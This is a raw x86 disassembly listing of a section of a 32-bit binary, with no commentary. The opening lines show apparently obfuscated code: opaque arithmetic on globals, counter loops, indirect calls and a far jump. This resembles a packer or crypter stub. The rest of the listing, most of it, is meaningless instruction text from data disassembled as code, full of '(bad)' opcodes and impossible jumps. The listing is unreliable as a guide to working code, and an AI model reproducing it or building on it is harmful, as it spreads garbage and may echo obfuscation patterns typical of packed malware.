  416a7b:	mov    eax,DWORD PTR [ebp+0x3733f179]
  416a81:	xor    al,0x75
  416a83:	cmp    eax,0xf795e4db
  416a88:	sbb    ebx,0xffffff92
  416a8b:	(bad)  
  416a8c:	mov    dh,0xe1
  416a8e:	xlat   BYTE PTR ds:[ebx]
  416a8f:	in     al,0x74
  416a91:	xor    al,0x30
  416a93:	and    ah,BYTE PTR [edx+0x5]
  416a96:	sub    ecx,DWORD PTR [edx]
  416a98:	cmc    
  416a99:	jg     0x416a9a
  416a9b:	jne    0x416a7d
  416a9d:	mov    eax,DWORD PTR [ebp-0x8]
  416aa0:	mov    eax,DWORD PTR [eax]
  416aa2:	mov    eax,DWORD PTR [eax]
  416aa4:	mov    eax,DWORD PTR [eax]
  416aa6:	call   eax
  416aa8:	mov    eax,DWORD PTR [ebp-0x34]
  416aab:	mov    ecx,DWORD PTR ds:0x42406e
  416ab1:	add    DWORD PTR [eax],ecx
  416ab3:	pop    edi
  416ab4:	pop    esi
  416ab5:	leave  
  416ab6:	ret    
  416ab7:	push   ebp
  416ab8:	mov    ebp,esp
  416aba:	sub    esp,0x18
  416abd:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  416ac4:	lea    eax,[ebp+0x14]
  416ac7:	mov    edx,DWORD PTR ds:0x42c00c
  416acd:	sub    DWORD PTR ds:0x42c01c,edx
  416ad3:	mov    DWORD PTR [ebp-0x4],eax
  416ad6:	and    DWORD PTR ds:0x42c01c,ebx
  416adc:	push   esi
  416add:	sub    ecx,esi
  416adf:	mov    esi,0xf89c85b6
  416ae4:	sub    ecx,ecx
  416ae6:	mov    DWORD PTR [ebp-0xc],esi
  416ae9:	or     DWORD PTR ds:0x42b000,0x59c6
  416af3:	lea    eax,[ebp-0xc]
  416af6:	sub    DWORD PTR ds:0x42b014,0x4110
  416b00:	mov    DWORD PTR [ebp-0x14],eax
  416b03:	add    ecx,ecx
  416b05:	mov    eax,DWORD PTR [ebp-0xc]
  416b08:	mov    edx,DWORD PTR [ebp-0x14]
  416b0b:	adc    DWORD PTR ds:0x429014,0x59c
  416b15:	mov    ecx,0x7510893
  416b1a:	xor    eax,ecx
  416b1c:	sub    DWORD PTR ds:0x42b014,0x42b004
  416b26:	add    eax,0x3272db
  416b2b:	mov    DWORD PTR [edx],eax
  416b2d:	mov    edx,DWORD PTR ds:0x42a004
  416b33:	add    DWORD PTR ds:0x429000,edx
  416b39:	mov    eax,ds:0x423e6a
  416b3e:	mov    edx,DWORD PTR ds:0x42901c
  416b44:	add    DWORD PTR ds:0x429000,edx
  416b4a:	mov    edx,DWORD PTR [ebp-0x4]
  416b4d:	sub    DWORD PTR ds:0x42d000,0x780c
  416b57:	mov    eax,DWORD PTR [eax]
  416b59:	add    eax,DWORD PTR [edx]
  416b5b:	add    DWORD PTR ds:0x42900c,ecx
  416b61:	push   edi
  416b62:	and    DWORD PTR ds:0x429020,0x0
  416b6c:	mov    edx,DWORD PTR ds:0x429020
  416b72:	inc    edx
  416b73:	mov    DWORD PTR ds:0x429020,edx
  416b79:	cmp    DWORD PTR ds:0x429020,0x25
  416b80:	jne    0x416b8f
  416b86:	push   DWORD PTR [ebp-0x20]
  416b89:	call   DWORD PTR ds:0x425028
  416b8f:	cmp    DWORD PTR ds:0x429020,0x19
  416b96:	jb     0x416b6c
  416b9c:	add    DWORD PTR ds:0x42c01c,0x73bd
  416ba6:	mov    DWORD PTR [ebp-0x8],eax
  416ba9:	adc    DWORD PTR ds:0x42d00c,ecx
  416baf:	mov    edi,DWORD PTR [ebp+0x8]
  416bb2:	sbb    DWORD PTR ds:0x42d018,0x1580
  416bbc:	mov    eax,ds:0x423ff2
  416bc1:	and    DWORD PTR ds:0x42b01c,0x0
  416bcb:	jmp    0x416bdd
  416bd0:	mov    edx,DWORD PTR ds:0x42b01c
  416bd6:	inc    edx
  416bd7:	mov    DWORD PTR ds:0x42b01c,edx
  416bdd:	cmp    DWORD PTR ds:0x42b01c,0x1a
  416be4:	jae    0x416c47
  416bea:	cmp    DWORD PTR ds:0x42b01c,0x10
  416bf1:	jne    0x416c1c
  416bf7:	push   0x2d19
  416bfc:	push   DWORD PTR [ebp-0x10]
  416bff:	push   0x42d014
  416c04:	push   0x14d6
  416c09:	push   0x3bac
  416c0e:	push   0x6779
  416c13:	push   DWORD PTR [ebp-0xc]
  416c16:	call   DWORD PTR ds:0x42502c
  416c1c:	cmp    DWORD PTR ds:0x42b01c,0xf
  416c23:	jne    0x416c38
  416c29:	xor    edx,edx
  416c2b:	add    edx,DWORD PTR ds:0x42b01c
  416c31:	inc    edx
  416c32:	mov    DWORD PTR ds:0x42b01c,edx
  416c38:	jmp    0x416bd0
  416c3d:	adc    DWORD PTR ds:0x429028,0x58d4
  416c47:	mov    eax,DWORD PTR [eax+0x198]
  416c4d:	mov    edx,DWORD PTR ds:0x424375
  416c53:	mov    edx,DWORD PTR [edx]
  416c55:	add    DWORD PTR ds:0x42d008,edx
  416c5b:	xor    edi,ecx
  416c5d:	or     edx,0x793e
  416c63:	jmp    0x41901b
  416c68:	paddsw mm6,QWORD PTR es:[eax+0x63a36ce3]
  416c70:	mov    eax,0xb7e19036
  416c75:	inc    edx
  416c76:	xchg   edi,eax
  416c77:	inc    esp
  416c78:	jp     0x416c9e
  416c7a:	popa   
  416c7b:	(bad)  
  416c7c:	(bad)  
  416c7d:	pop    edi
  416c7e:	bound  esp,QWORD PTR [edx+0x3a]
  416c81:	cmp    eax,esi
  416c83:	sbb    ax,0xe957
  416c87:	rcl    DWORD PTR [esi],1
  416c89:	add    BYTE PTR [ecx-0x36adc43e],bh
  416c8f:	sti    
  416c90:	mov    DWORD PTR ds:0x40dc1adb,esp
  416c96:	(bad)  
  416c97:	jbe    0x416c3e
  416c99:	pushf  
  416c9a:	push   ds
  416c9b:	push   0xa6337cb0
  416ca0:	xchg   ebx,eax
  416ca1:	pushf  
  416ca2:	ret    
  416ca3:	das    
  416ca4:	pop    ds
  416ca5:	aam    0x81
  416ca7:	pusha  
  416ca8:	(bad)  
  416ca9:	or     al,0x60
  416cab:	xor    ecx,DWORD PTR [edx-0x6dbb3514]
  416cb1:	outs   dx,DWORD PTR ds:[esi]
  416cb2:	ret    
  416cb3:	popf   
  416cb4:	dec    edi
  416cb5:	ins    BYTE PTR es:[edi],dx
  416cb6:	test   al,0xfb
  416cb8:	mov    al,ds:0x42503cdf
  416cbd:	jb     0x416d01
  416cbf:	rol    dh,0xca
  416cc2:	(bad)  
  416cc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cc4:	jnp    0x416c53
  416cc6:	aaa    
  416cc7:	xchg   edi,eax
  416cc8:	loopne 0x416d0c
  416cca:	and    BYTE PTR [edi-0x15bde6e1],dl
  416cd0:	in     al,dx
  416cd1:	daa    
  416cd2:	(bad)  
  416cd3:	push   ss
  416cd4:	fidivr DWORD PTR [edi+0x61bfd5e8]
  416cda:	push   0x5a
  416cdc:	cld    
  416cdd:	pop    ecx
  416cde:	test   eax,0xc59b5659
  416ce3:	inc    ebp
  416ce4:	mov    ecx,0x2b9a6a41
  416ce9:	mov    bh,0xdd
  416ceb:	mov    cl,BYTE PTR [edx+0x5e]
  416cee:	add    ebp,edi
  416cf0:	call   0xabbadf6b
  416cf5:	push   edx
  416cf6:	(bad)  
  416cf7:	mov    bh,BYTE PTR [esi-0x30]
  416cfa:	mov    ebp,0xe364fc9d
  416cff:	ins    BYTE PTR es:[edi],dx
  416d00:	add    al,0x9e
  416d02:	gs pop esi
  416d04:	lods   eax,DWORD PTR ds:[esi]
  416d05:	push   ebp
  416d06:	sahf   
  416d07:	xor    BYTE PTR [edx-0x66629401],dl
  416d0d:	add    eax,0xb46b0d9
  416d12:	push   0x34a3649
  416d17:	inc    eax
  416d18:	sbb    esi,edi
  416d1a:	ror    DWORD PTR [eax-0x13],0x78
  416d1e:	sar    dl,0xff
  416d21:	aaa    
  416d22:	dec    ebx
  416d23:	fwait
  416d24:	inc    esi
  416d25:	push   ss
  416d26:	iret   
  416d27:	pop    eax
  416d28:	cwde   
  416d29:	sbb    DWORD PTR [edi],ebp
  416d2b:	push   edx
  416d2c:	rcr    BYTE PTR ds:0x61515ca5,cl
  416d32:	push   es
  416d33:	in     al,0xef
  416d35:	jg     0x416cc1
  416d37:	dec    esi
  416d38:	inc    edi
  416d39:	nop
  416d3a:	cmp    DWORD PTR [ecx+0x2d],edi
  416d3d:	mov    eax,ds:0xf6d40f3b
  416d42:	stc    
  416d43:	inc    ebp
  416d44:	(bad)  
  416d45:	out    dx,al
  416d46:	mov    gs,WORD PTR [ebx]
  416d48:	fs xchg esp,eax
  416d4a:	aas    
  416d4b:	jne    0x416d5d
  416d4d:	shr    BYTE PTR [eax],cl
  416d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d50:	fcomp  QWORD PTR [ecx]
  416d52:	jmp    0x6cba:0x4d62904f
  416d59:	scas   al,BYTE PTR es:[edi]
  416d5a:	xor    ah,BYTE PTR [eax+0x22]
  416d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d5e:	bound  esi,QWORD PTR [esi+0x675558da]
  416d64:	into   
  416d65:	gs push ebp
  416d67:	jl     0x416d87
  416d69:	nop
  416d6a:	add    DWORD PTR [ebp+0x1e],0xffffffaf
  416d6e:	jbe    0x416dc7
  416d70:	cmc    
  416d71:	mov    ds:0x289fe0e8,eax
  416d76:	cwde   
  416d77:	dec    eax
  416d78:	mov    al,ds:0x12596b93
  416d7d:	out    dx,al
  416d7e:	test   ah,bl
  416d80:	mov    ecx,0xd6605109
  416d85:	iret   
  416d86:	cmp    BYTE PTR [ebp+eiz*8+0x5848b937],bl
  416d8d:	mov    al,0xdb
  416d8f:	jne    0x416d50
  416d91:	and    al,0x1d
  416d93:	jnp    0x416d9e
  416d95:	imul   DWORD PTR [edx-0x12]
  416d98:	call   0x9076:0x96aebc78
  416d9f:	jp     0x416da1
  416da1:	fucomp st(6)
  416da3:	sbb    BYTE PTR [ebx],bh
  416da5:	test   BYTE PTR [esi],ah
  416da7:	jnp    0x416da0
  416da9:	fst    DWORD PTR [esi]
  416dab:	ins    BYTE PTR es:[edi],dx
  416dac:	ins    DWORD PTR es:[edi],dx
  416dad:	lods   al,BYTE PTR ds:[esi]
  416dae:	or     al,0xec
  416db0:	push   edi
  416db1:	pop    ebp
  416db2:	push   ds
  416db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416db4:	or     esp,ecx
  416db6:	cmp    ah,BYTE PTR [ebx+edi*4]
  416db9:	mov    gs,ecx
  416dbb:	sub    DWORD PTR [ebx],ebx
  416dbd:	popf   
  416dbe:	push   0xd112152
  416dc3:	mov    ebx,0xd236afb1
  416dc8:	les    ecx,FWORD PTR [ecx+ebp*4]
  416dcb:	pop    ss
  416dcc:	push   edx
  416dcd:	sbb    dl,BYTE PTR [edx]
  416dcf:	dec    eax
  416dd0:	fisttp WORD PTR [esi-0x4e]
  416dd3:	or     al,0x1a
  416dd5:	push   cs
  416dd6:	outs   dx,BYTE PTR ds:[esi]
  416dd7:	shr    BYTE PTR [esi-0x62],0x96
  416ddb:	pop    eax
  416ddc:	push   es
  416ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dde:	(bad)  
  416ddf:	mov    ch,0xb8
  416de1:	or     ecx,edi
  416de3:	sbb    eax,0x1b4b48a
  416de8:	push   0xdbb30037
  416ded:	clc    
  416dee:	aam    0x6f
  416df0:	loope  0x416dec
  416df2:	add    ebx,DWORD PTR [ecx-0x6e]
  416df5:	stc    
  416df6:	xlat   BYTE PTR ds:[ebx]
  416df7:	outs   dx,BYTE PTR ds:[esi]
  416df8:	inc    esp
  416df9:	in     al,0xf1
  416dfb:	sbb    eax,0x61e84f48
  416e00:	mov    ds:0x57bee5cf,al
  416e05:	loop   0x416de5
  416e07:	sub    eax,0xafeac706
  416e0c:	dec    eax
  416e0d:	fnstenv [eax]
  416e0f:	dec    eax
  416e10:	hlt    
  416e11:	test   al,0xc9
  416e13:	pop    ecx
  416e14:	or     eax,0x78dfad27
  416e19:	stc    
  416e1a:	ins    BYTE PTR es:[edi],dx
  416e1b:	inc    esi
  416e1c:	cdq    
  416e1d:	in     al,dx
  416e1e:	mov    cl,cl
  416e20:	and    bh,bh
  416e22:	(bad)  
  416e24:	add    al,0x23
  416e26:	mov    eax,0x2c6581d6
  416e2b:	dec    esp
  416e2c:	add    al,0x76
  416e2e:	js     0x416e29
  416e30:	and    al,0x6f
  416e32:	fiadd  DWORD PTR [edx+esi*2]
  416e35:	gs call 0xc376764f
  416e3b:	jle    0x416e24
  416e3d:	retf   0xba4a
  416e40:	pop    ebx
  416e41:	mov    esi,0x3c000127
  416e46:	cmp    eax,0x966ddf88
  416e4b:	xor    DWORD PTR [esi+0x77e81003],0xdb0e6fda
  416e55:	mov    edi,?
  416e57:	and    eax,0x99d1dcc
  416e5c:	or     eax,0x7ad536ee
  416e61:	or     dh,BYTE PTR [ebp-0x50c63f20]
  416e67:	ret    0xdbca
  416e6a:	fs jl  0x416dfe
  416e6d:	(bad)  
  416e6e:	pop    edi
  416e6f:	imul   edx,DWORD PTR [esi],0xffffffff
  416e72:	je     0x416eab
  416e74:	cli    
  416e75:	ins    DWORD PTR es:[edi],dx
  416e76:	imul   esp,edx,0x3b52ab84
  416e7c:	ja     0x416e78
  416e7e:	push   cs
  416e7f:	fld    TBYTE PTR [edx]
  416e81:	gs jnp 0x416eb5
  416e84:	das    
  416e85:	mov    edi,0x8891ee66
  416e8a:	outs   dx,DWORD PTR ds:[esi]
  416e8b:	xlat   BYTE PTR ds:[ebx]
  416e8c:	outs   dx,BYTE PTR ds:[esi]
  416e8d:	mov    edi,0x952ff69a
  416e92:	cwde   
  416e93:	(bad)  
  416e94:	jno    0x416ea9
  416e96:	push   ss
  416e97:	fcmovu st,st(0)
  416e99:	cld    
  416e9a:	fwait
  416e9b:	lods   al,BYTE PTR ds:[esi]
  416e9c:	xchg   edi,eax
  416e9d:	cdq    
  416e9e:	add    DWORD PTR [edx+0x56],edi
  416ea1:	push   edx
  416ea2:	mov    edx,0x8b58de9b
  416ea7:	mov    WORD PTR [eax],gs
  416ea9:	lds    edi,FWORD PTR [ecx-0x62d3e22]
  416eaf:	xor    eax,0x55ed19cb
  416eb4:	cmp    bl,BYTE PTR [esi]
  416eb6:	imul   edx,eax,0xf0164865
  416ebc:	daa    
  416ebd:	sti    
  416ebe:	pop    ds
  416ebf:	dec    ebx
  416ec0:	jo     0x416ef8
  416ec2:	dec    esi
  416ec3:	push   ebx
  416ec4:	dec    eax
  416ec5:	shl    esp,cl
  416ec7:	or     eax,0x698567a9
  416ecc:	mov    al,0x93
  416ece:	mov    DWORD PTR [esi+ebx*8-0x42],esi
  416ed2:	xchg   DWORD PTR [esi+0x5547b526],esi
  416ed8:	sub    eax,0x907f69f5
  416edd:	pop    ebx
  416ede:	dec    ebx
  416edf:	repz aas 
  416ee1:	cmp    BYTE PTR [edx],ch
  416ee3:	lea    eax,[edi]
  416ee5:	xlat   BYTE PTR ds:[ebx]
  416ee6:	mov    ebx,DWORD PTR [eax-0xb01f086]
  416eec:	repz and eax,0x7406e24
  416ef2:	push   ebp
  416ef3:	jge    0x416ea5
  416ef5:	inc    esi
  416ef6:	cmp    dl,dh
  416ef8:	mov    ch,0x3
  416efa:	dec    edx
  416efb:	mov    DWORD PTR [edi-0x49d5135b],ecx
  416f01:	call   0xd335e21
  416f06:	cmc    
  416f07:	cmp    eax,0x6f15961d
  416f0c:	jge    0x416f86
  416f0e:	aas    
  416f0f:	fnstcw WORD PTR [esi]
  416f11:	mov    ecx,0xeabfbae1
  416f16:	pop    ecx
  416f17:	stos   DWORD PTR es:[edi],eax
  416f18:	push   ebx
  416f19:	dec    ebp
  416f1a:	fcmovnbe st,st(0)
  416f1c:	push   ebp
  416f1d:	inc    ebp
  416f1e:	xor    al,0x69
  416f20:	ficomp DWORD PTR [ecx]
  416f22:	sbb    BYTE PTR [edx-0x4b],dl
  416f25:	pushf  
  416f26:	(bad)  [edx+edi*1-0x3cb1034d]
  416f2d:	add    bl,bh
  416f2f:	push   ecx
  416f30:	das    
  416f31:	mul    BYTE PTR [edi]
  416f33:	mov    BYTE PTR [bx],cl
  416f36:	pop    edx
  416f37:	lds    esi,FWORD PTR [ebp+0x62]
  416f3a:	hlt    
  416f3b:	push   cs
  416f3c:	and    ebx,esi
  416f3e:	push   ss
  416f3f:	dec    edx
  416f40:	jns    0x416f6f
  416f42:	mov    ds:0xd4bc9ab8,eax
  416f47:	cld    
  416f48:	xor    bl,BYTE PTR [ebp+esi*4-0x22]
  416f4c:	push   eax
  416f4d:	adc    cl,al
  416f4f:	xchg   edi,eax
  416f50:	vpmaxsw ymm4,ymm6,YMMWORD PTR [ebx]
  416f54:	fwait
  416f55:	push   ecx
  416f56:	outs   dx,BYTE PTR ds:[esi]
  416f57:	dec    ebp
  416f58:	xor    ebp,DWORD PTR [ebx+esi*2]
  416f5b:	daa    
  416f5c:	inc    esp
  416f5d:	loopne 0x416fa1
  416f5f:	inc    edi
  416f60:	lds    esi,FWORD PTR [edi-0x14c1ebdb]
  416f66:	xlat   BYTE PTR ds:[ebx]
  416f67:	rcl    DWORD PTR [eax+0x75065a29],1
  416f6d:	push   ss
  416f6e:	cld    
  416f6f:	fsub   DWORD PTR [esp+ecx*2-0x6e3b860b]
  416f76:	(bad)  
  416f78:	push   es
  416f79:	(bad)  
  416f7a:	pop    ss
  416f7b:	inc    ecx
  416f7c:	cwde   
  416f7d:	sqrtps xmm2,XMMWORD PTR [ebx-0x4df89450]
  416f84:	vcvtss2sd xmm7,xmm2,DWORD PTR [esi]
  416f88:	pop    ebp
  416f89:	jg     0x416f9e
  416f8b:	pop    eax
  416f8c:	cmp    eax,0x511e78c7
  416f91:	dec    edx
  416f92:	scas   eax,DWORD PTR es:[edi]
  416f93:	sbb    cl,BYTE PTR [edi+0x3e7764a0]
  416f99:	mov    esi,esi
  416f9b:	in     al,dx
  416f9c:	jecxz  0x41700a
  416f9e:	scas   al,BYTE PTR es:[edi]
  416f9f:	inc    esi
  416fa0:	stos   DWORD PTR es:[edi],eax
  416fa1:	dec    esi
  416fa2:	scas   eax,DWORD PTR es:[edi]
  416fa3:	push   esp
  416fa4:	push   esp
  416fa5:	arpl   WORD PTR [ecx-0x28],si
  416fa8:	out    0x8d,eax
  416faa:	popa   
  416fab:	jg     0x416f49
  416fad:	jl     0x416f35
  416faf:	ins    DWORD PTR es:[edi],dx
  416fb0:	mov    BYTE PTR [esi-0x51ae79b8],dl
  416fb6:	or     dh,ch
  416fb8:	lahf   
  416fb9:	call   0xaaad6a48
  416fbe:	cmp    al,0x6d
  416fc0:	stc    
  416fc1:	sub    BYTE PTR [ecx-0x7],dl
  416fc4:	test   DWORD PTR [eax+0x24],edx
  416fc7:	cdq    
  416fc8:	mov    ds:0x6e3906e9,eax
  416fcd:	mov    ebp,0x8a7eb2c
  416fd2:	xchg   esi,eax
  416fd3:	cmp    BYTE PTR [eax-0x31e17887],bh
  416fd9:	retf   
  416fda:	pop    esp
  416fdb:	rol    DWORD PTR [edx+0x3621dba3],1
  416fe1:	fimul  DWORD PTR [ebp+0x3c46aab1]
  416fe7:	jmp    0x4c3f8e30
  416fec:	push   ss
  416fed:	shr    DWORD PTR [eax],0x95
  416ff0:	or     eax,0x9444b824
  416ff5:	js     0x416fdf
  416ff7:	inc    esp
  416ff8:	jbe    0x41705a
  416ffa:	cmc    
  416ffb:	jge    0x417039
  416ffd:	pop    ecx
  416ffe:	mov    ds:0x1e243bb6,eax
  417003:	sti    
  417004:	jne    0x416fff
  417006:	sub    edx,DWORD PTR [esp+eiz*8]
  417009:	jge    0x41703a
  41700b:	test   ebx,ecx
  41700d:	ja     0x41703b
  41700f:	adc    edx,edi
  417011:	dec    edi
  417012:	xchg   esp,eax
  417013:	outs   dx,DWORD PTR ds:[esi]
  417014:	add    al,BYTE PTR [edx+0x428b2a0e]
  41701a:	sub    ch,dh
  41701c:	mov    DWORD PTR [edx],edx
  41701e:	clc    
  41701f:	out    dx,eax
  417020:	in     al,0xb8
  417022:	inc    ebp
  417023:	pop    esp
  417024:	loope  0x417005
  417026:	push   edi
  417027:	out    0x9d,al
  417029:	inc    esi
  41702a:	(bad)  
  41702b:	adc    DWORD PTR [edx],ebx
  41702d:	lods   al,BYTE PTR ds:[esi]
  41702e:	add    ecx,DWORD PTR [esi-0x15]
  417031:	std    
  417032:	mov    dh,0x75
  417034:	push   ecx
  417035:	(bad)  
  417036:	icebp  
  417037:	popf   
  417038:	push   edi
  417039:	jno    0x41706c
  41703b:	push   ecx
  41703c:	sbb    esp,DWORD PTR [ecx+eiz*2]
  41703f:	pop    eax
  417040:	adc    eax,DWORD PTR [ebx+ecx*2+0x75]
  417044:	mov    ah,0xb5
  417046:	add    edx,ebp
  417048:	push   ebp
  417049:	and    al,0xaf
  41704b:	add    ch,bh
  41704d:	dec    ecx
  41704e:	repz repz pop ebx
  417051:	push   esi
  417052:	mov    fs,WORD PTR [ecx-0x1d601b5]
  417058:	and    DWORD PTR [ecx+ebp*1-0x4edf02ec],esi
  41705f:	jl     0x417077
  417061:	mov    edx,0x727c404f
  417066:	mov    ebp,0xb57df4d7
  41706b:	cmp    BYTE PTR [edi+0x27],cl
  41706e:	sbb    bl,al
  417070:	jl     0x4170bf
  417072:	xchg   esp,eax
  417073:	sahf   
  417074:	out    0x67,al
  417076:	and    eax,0xb506b663
  41707b:	jae    0x4170bc
  41707d:	or     al,0xe4
  41707f:	cmp    al,0x57
  417081:	enter  0xbf50,0xef
  417085:	add    cl,dl
  417087:	aas    
  417088:	ss push ebp
  41708a:	popa   
  41708b:	and    ebx,DWORD PTR [ecx]
  41708d:	popa   
  41708e:	std    
  41708f:	mov    bh,BYTE PTR ds:0x6859b93
  417095:	and    al,0x36
  417097:	cld    
  417098:	hlt    
  417099:	cmp    eax,0xb4c51efd
  41709e:	in     al,dx
  41709f:	mov    cl,0xb7
  4170a1:	mov    ds:0xeb24f0d2,al
  4170a6:	fist   WORD PTR [edx]
  4170a8:	(bad)  
  4170a9:	mov    dl,0xbc
  4170ab:	or     BYTE PTR [eax],cl
  4170ad:	cwde   
  4170ae:	sub    esi,ebx
  4170b0:	and    al,BYTE PTR [edi-0x3924eec7]
  4170b6:	mov    ebp,0x63bbfbb9
  4170bb:	int3   
  4170bc:	fsubrp st(7),st
  4170be:	or     al,0xd9
  4170c0:	mov    ah,0x67
  4170c2:	fmul   DWORD PTR [eax+0xf]
  4170c5:	scas   eax,DWORD PTR es:[edi]
  4170c6:	push   edx
  4170c7:	pop    eax
  4170c8:	or     al,0x11
  4170ca:	add    eax,0x8b93445d
  4170cf:	push   ebp
  4170d0:	mov    edx,0x4306cb39
  4170d5:	pop    ss
  4170d6:	mov    edx,es
  4170d8:	cld    
  4170d9:	jae    0x41707c
  4170db:	bts    edx,esi
  4170de:	dec    ecx
  4170df:	cmp    al,0x3c
  4170e1:	or     esi,DWORD PTR [esi]
  4170e3:	(bad)  
  4170e4:	mov    esi,0xfa8a086d
  4170e9:	sub    eax,0x90066349
  4170ee:	lods   al,BYTE PTR ds:[esi]
  4170ef:	sub    BYTE PTR [edi-0x4c94a0de],dl
  4170f5:	imul   edx,DWORD PTR [edx],0x7418c334
  4170fb:	jg     0x41714b
  4170fd:	and    bl,BYTE PTR [bx+di-0xe]
  417101:	pop    edx
  417102:	hlt    
  417103:	lock (bad) 
  417105:	aam    0xe6
  417107:	ror    esp,1
  417109:	add    ecx,DWORD PTR [ebp+0x5d10460a]
  41710f:	jbe    0x41712e
  417111:	aas    
  417112:	dec    esp
  417113:	cwde   
  417114:	xchg   edi,eax
  417115:	jns    0x4170fa
  417117:	shl    DWORD PTR [esi-0x5c42df07],0xee
  41711e:	scas   eax,DWORD PTR es:[edi]
  41711f:	jo     0x41715c
  417121:	sub    al,0x60
  417123:	or     esi,DWORD PTR [ebx-0x57]
  417126:	clc    
  417127:	jmp    0x8f1b2191
  41712c:	mov    bh,0x5d
  41712e:	sub    eax,0x66dcdb7e
  417133:	or     eax,0xd1297704
  417138:	aam    0x1a
  41713a:	jmp    0x187fb4fa
  41713f:	mov    ch,0xb7
  417141:	and    DWORD PTR [eax+0x21],ebp
  417144:	mov    eax,ds:0x124b080e
  417149:	fdivr  st(1),st
  41714b:	outs   dx,BYTE PTR ds:[esi]
  41714c:	(bad)  
  41714d:	stc    
  41714e:	fcmove st,st(6)
  417150:	fs sbb edx,esp
  417153:	loope  0x4171c7
  417155:	(bad)  
  417156:	mov    ds:0x342dde28,eax
  41715b:	mov    ah,dl
  41715d:	adc    bh,dh
  41715f:	cmc    
  417160:	int3   
  417161:	xchg   ebp,eax
  417162:	in     al,0x98
  417164:	sub    eax,0x9f24c3b5
  417169:	pusha  
  41716a:	mov    BYTE PTR [ebp-0x569587d3],dh
  417170:	sbb    esp,edi
  417172:	jmp    0xe756fe0a
  417177:	and    eax,0xd3e57136
  41717c:	mov    esp,0xf4781c7f
  417181:	jo     0x41712f
  417183:	mov    edx,0x1f3595
  417188:	stc    
  417189:	jae    0x41714a
  41718b:	and    ebp,esp
  41718d:	jg     0x417148
  41718f:	adc    esi,ebx
  417191:	sbb    al,0xe5
  417193:	mov    dh,0xf4
  417195:	cld    
  417196:	ret    
  417197:	adc    al,0xda
  417199:	sub    DWORD PTR ss:[ebx+0x1c4dea5],esi
  4171a0:	sub    eax,edx
  4171a2:	or     ch,BYTE PTR [edi+0x37]
  4171a5:	push   0xffffffc3
  4171a7:	ficom  DWORD PTR [edx]
  4171a9:	iret   
  4171aa:	mov    esi,0xd182a56f
  4171af:	sub    DWORD PTR [ebx+0x7b58daf9],ecx
  4171b5:	cdq    
  4171b6:	sbb    bl,BYTE PTR [ebx+0x4a]
  4171b9:	out    dx,al
  4171ba:	adc    esp,ecx
  4171bc:	pop    esp
  4171bd:	into   
  4171be:	dec    edi
  4171bf:	div    DWORD PTR [ecx]
  4171c1:	lds    esp,FWORD PTR [ecx+ebx*8+0x1b]
  4171c5:	fnsave [ebp-0x1]
  4171c8:	xchg   esp,eax
  4171c9:	jmp    0xd473:0x48824bc5
  4171d0:	dec    ebx
  4171d1:	pop    edi
  4171d2:	stos   DWORD PTR es:[edi],eax
  4171d3:	mov    ebx,0x4d894d1d
  4171d8:	inc    eax
  4171d9:	fs mov cl,cl
  4171dc:	mul    BYTE PTR [esp+eiz*4+0x71]
  4171e0:	xchg   edx,eax
  4171e1:	pop    esp
  4171e2:	popa   
  4171e3:	xor    eax,0x3ff63bbb
  4171e8:	mov    ds:0x66292fa9,eax
  4171ed:	(bad)  
  4171ee:	or     eax,0xa4483b73
  4171f3:	fxch   st(2)
  4171f5:	mov    ds:0xbbed6275,eax
  4171fa:	dec    ebp
  4171fb:	(bad)  
  4171fc:	pusha  
  4171fd:	out    0xdd,eax
  4171ff:	ss jbe 0x417279
  417202:	jne    0x41727c
  417204:	cmp    cl,BYTE PTR ds:0x911fbc8f
  41720a:	jbe    0x417230
  41720c:	pop    edx
  41720d:	out    0x54,eax
  41720f:	stos   DWORD PTR es:[edi],eax
  417210:	aad    0xb2
  417212:	mov    al,ds:0x4373766b
  417217:	in     eax,dx
  417218:	xor    bl,bh
  41721a:	mov    edi,DWORD PTR [edx+edx*2+0x61508cf1]
  417221:	pop    esi
  417222:	ins    DWORD PTR es:[edi],dx
  417223:	sub    al,cl
  417225:	mov    al,ds:0x6458668a
  41722a:	push   esi
  41722b:	mov    ebx,0x7671ea78
  417230:	stos   DWORD PTR es:[edi],eax
  417231:	aaa    
  417232:	dec    esp
  417233:	ret    
  417234:	gs mov ch,0x59
  417237:	jl     0x417273
  417239:	xchg   esp,eax
  41723a:	int    0xe6
  41723c:	jno    0x4171c7
  41723e:	call   0xc758:0xef9c8c2
  417245:	push   esi
  417246:	mov    bl,0xe0
  417248:	jns    0x41720e
  41724a:	dec    ebp
  41724b:	dec    eax
  41724c:	into   
  41724d:	adc    esi,ecx
  41724f:	xchg   edx,eax
  417250:	ja     0x417276
  417252:	fs retf 
  417254:	push   eax
  417255:	mov    ?,WORD PTR [eax-0x26]
  417258:	fprem1 
  41725a:	mov    ecx,0x5304c14f
  41725f:	imul   ch
  417261:	jp     0x417250
  417263:	test   DWORD PTR [ebx-0x2f],ebp
  417266:	jnp    0x4172a1
  417268:	mov    edx,0x98591d86
  41726d:	pop    edi
  41726e:	imul   esi,DWORD PTR ds:0x8c1c0572,0xe63104b7
  417278:	xchg   ebx,eax
  417279:	push   ds
  41727a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41727b:	or     ebx,DWORD PTR [ebx]
  41727d:	and    edx,DWORD PTR [edi+0x6a]
  417280:	adc    edx,DWORD PTR [ebp-0x21127217]
  417286:	lock dec esi
  417288:	(bad)  
  417289:	out    0x48,al
  41728b:	mov    ?,WORD PTR [ebx-0x8693898]
  417291:	loope  0x41723f
  417293:	hlt    
  417294:	add    ebp,DWORD PTR [esi-0x496d035d]
  41729a:	jbe    0x4172f8
  41729c:	cmp    esp,DWORD PTR [ebx+0x30]
  41729f:	fsubr  DWORD PTR [ecx-0xf]
  4172a2:	shl    DWORD PTR [edx],0xf2
  4172a5:	arpl   WORD PTR [eax],bx
  4172a7:	rcl    BYTE PTR [edx+edi*8-0x25],0xeb
  4172ac:	push   es
  4172ad:	sub    al,0xbb
  4172af:	test   BYTE PTR [ecx-0x34],dh
  4172b2:	push   ebp
  4172b3:	cmp    bh,BYTE PTR [esi-0x684075ec]
  4172b9:	ins    DWORD PTR es:[edi],dx
  4172ba:	pop    edx
  4172bb:	mov    BYTE PTR [ebx-0x5],dh
